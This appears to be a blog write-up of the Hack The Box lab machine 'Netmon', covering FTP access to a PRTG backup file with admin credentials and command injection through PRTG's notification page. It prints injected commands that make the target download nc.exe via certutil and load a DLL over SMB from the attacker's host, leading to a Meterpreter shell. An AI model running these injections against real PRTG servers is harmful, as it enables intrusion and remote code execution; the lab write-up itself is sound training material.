+++
title = "HTB/Netmon"
date = "2019-03-03"
tags = ["htb", "Windows", "PRTG Network Monitor", "Certutil"]
categories = ["Development"]
menu = "main"
draft = false
+++


![alt text](/images/htb-Netmon/img1.png)
![alt text](/images/htb-Netmon/img2.png)


# Reconnaissance

##### Box IP: 10.10.10.152
1. I started by scanning the network. Here's what I found:


![alt text](/images/htb-Netmon/img3.png)
![alt text](/images/htb-Netmon/img4.png)

2. Port 80 hosts a login page for PRTG Network Monitor. I found it to be vulnerable to cross-site scripting (XSS). 

![alt text](/images/htb-Netmon/img5.png)


3. For FileZilla, I tried FTP. I was looking for a configuration file (configuration.old) that reportedly held credentials, according to this Reddit post [link](https://www.reddit.com/r/sysadmin/comments/862b8s/prtg_gave_away_some_of_your_passwords/) 
  
* Initially, I couldn’t find it until I learned it was hidden. Once I enabled “Show hidden files” in /programData/Paessler/PRTG Network Monitor, I found the configuration file.


![alt text](/images/htb-Netmon/img6.png)
![alt text](/images/htb-Netmon/img8.png)
![alt text](/images/htb-Netmon/img9.png)
 
* I found the configuration file in programdata/passeler/PRTG/Configuration.old.bak

* **Credentials:** >prtgadmin  →  PrTg@dmin2018  

* I was getting incorrect login with this credentials, after a hint the folks in the hitb discord, I tried **PrTg@dmin2019** which worked!

![alt text](/images/htb-Netmon/img10.png)

4. In FileZilla, after enabling hidden files under server>show hidden files, I found USER.txt under /Users/Public.


![alt text](/images/htb-Netmon/img11.png)

5. Using these credentials, I logged into the system.

![alt text](/images/htb-Netmon/img12.png)
![alt text](/images/htb-Netmon/img13.png)

* I found a CVE exploit that allows remote command execution through the notification page. links:
  
  https://www.ptsecurity.com/ww-en/analytics/threatscape/pt-2018-23/
  https://www.codewatch.org/blog/?p=453
  https://www.exploit-db.com/exploits/46527

* I used exploit #46527 to create a payload

6. first, I set up a simplehttpserver to transfer nc.exe, the payload, to establish a session.

![alt text](/images/htb-Netmon/img18.png)
![alt text](/images/htb-Netmon/img19.png)

7. In the **create_user()** function (7th line) in the figure below, starting from "&message_10 parameter", I injected an HTML-encoded command that would execute through the notification page.
* **Command**
```bash
test.txt|"certutil.exe -urlcache -split -f http://10.10.12.11/nc.exe c:\users\public\Music\nc.exe"
```
![alt text](/images/htb-Netmon/img17.png)

![alt text](/images/htb-Netmon/img15.png)

8. After executing a certutil GET request to the HTTP server, I successfully uploaded the nc.exe.

![alt text](/images/htb-Netmon/img30.png)

9. Next, I used the same script to run nc.exe and I had set up a listener on my attack machine to establish a connection

![alt text](/images/htb-Netmon/img16.png)
![alt text](/images/htb-Netmon/img21.png)

* For some reason the shell from nc didn't work, It wasn't a full shell
------------------------------------------------------------------------
* I tried other things and here's what I found to work for me:

![alt text](/images/htb-Netmon/img22.png)

1.  Press F12 once logged-in to open inspect element and get the cookie paramters.
  
![alt text](/images/htb-Netmon/img23.png)

* Inside rundl32.sh.. The most important paramenter...After "&message_10="

![alt text](/images/htb-Netmon/img24.png)

11. I used w3school to encode the command I want to inject in html
  
```bash
test.txt|"rundll32.exe \\10.10.12.11\uqMdU\test.dll,0
```
![alt text](/images/htb-Netmon/img26.png)

```bash
text=test.txt%7C%22rundll32.exe+%5C%5C10.10.12.11%5CuqMdU%5Ctest.dll%2C0%22
```

12. Executing rundl32.sh displayed "titanrundl2" on the notification page. 

![lt text](/images/htb-Netmon/img29.png)

13. Using the **windows/smb/smb_delivery** exploit module in metasploit with a job running on port 8081, I finally gained a Meterpreter shell! 
![alt text](/images/htb-Netmon/img28.png)
![alt text](/images/htb-Netmon/img27.png)

![alt text](/images/htb-Netmon/img31.png)
![alt text](/images/htb-Netmon/img32.png)

## Ladies and Gentlemen, we are in! 🎉

![alt text](/images/htb-Netmon/img33.png)
![alt text](/images/htb-Netmon/img34.png)
![alt text](/images/htb-Netmon/img35.png)


**Hash:** 3018977fb944bf1878f75b879fba67cc

It took a while, but mission accomplished!
